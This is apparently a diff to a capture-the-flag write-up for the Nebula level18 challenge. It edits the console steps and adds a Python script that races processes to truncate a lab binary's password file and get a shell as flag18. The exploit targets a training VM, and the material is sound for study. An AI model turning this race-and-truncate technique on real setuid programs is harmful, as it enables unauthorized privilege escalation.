@@ -300,7 +300,7 @@ So we can do the following,
 * run `./flag18 -d password` (process 1) to overwrite password
 * simultaneously run `./flag18 -d password -d test` (process 2) to truncate `\n` debug message written by first process
 * return to process 1 and use `site exec newpassword` to write a new password
-* run `./flag18 -c $SHELL` (process 3) to login with new password and execute a shell
+* run `./flag18` (process 3) to login with new password and execute a shell
 
 Let's run the exploit manually,
 ```console
@@ -317,15 +317,13 @@ site exec newpassword
 ```
 ```console
 [PROCESS 3]
-level18@nebula:/home/flag18$ ./flag18 -c $SHELL
-./flag18: invalid option -- 'c'
+level18@nebula:/home/flag18$ ./flag18
 login newpassword
 shell
 ```
 Didn't work, why though? Let's run the third process again, this time with debugging.
 ```console
-level18@nebula:/home/flag18$ ./flag18 -c $SHELL -d test -vvv
-./flag18: invalid option -- 'c'
+level18@nebula:/home/flag18$ ./flag18 -d test -vvv
 login newpassword
 shell
 ```
@@ -379,18 +377,55 @@ And then in `login()` we compare the password given and read from the file till 
 ```
 We need to input an empty password (`NULL`) in the login endpoint to pass the compare.
 ```console
-level18@nebula:/home/flag18$ ./flag18 -c $SHELL
-./flag18: invalid option -- 'c'
+level18@nebula:/home/flag18$ ./flag18
 login
 shell
-sh-4.2$ whoami
+flag18@nebula:~$ whoami
 flag18
+flag18@nebula:~$ getflag
+You have successfully executed getflag on a target account
 ```
-Congratz! Visit the appendix for a Python script automating this exploit.
+Congratz! Visit the appendix for a Python script automating the exploit.
 
 ### Second Exploit
 WIP
 
 ## Appendix
 ### First Exploit Script
-WIP
+```python
+import subprocess
+import os
+
+PROGRAM = r'/home/flag18/flag18'
+PASSWORD_FILE = r'/home/flag18/password'
+
+print "This exploit will erase the password file, should continue?"
+if raw_input('y to continue: ') != 'y':
+        raise Exception("user chose not to continue with exploit")
+
+# start process 1, this will write garbage message to password file
+p1 = subprocess.Popen([PROGRAM, '-d', PASSWORD_FILE], stdin=subprocess.PIPE)
+
+# start process 2, this will truncate password file
+p2 = subprocess.Popen([PROGRAM, '-d', PASSWORD_FILE, '-d', '/tmp/test'], stdin=subprocess.PIPE)
+
+# EOF - the program will terminate
+p2.stdin.close()
+if p2.wait() != 0:
+        raise Exception("process 2 failed to terminate successfully")
+
+# write empty string to password file
+p1.stdin.write('site exec love')
+
+# terminate p1
+p1.stdin.close()
+if p1.wait() != 0:
+        raise Exception("process 1 failed to terminate successfully")
+
+print "Exploit finished successfully..."
+print "Login with a blank password to get a shell!\n"
+
+# execute process 3, this process will launch the shell
+os.system(PROGRAM)
+
+```
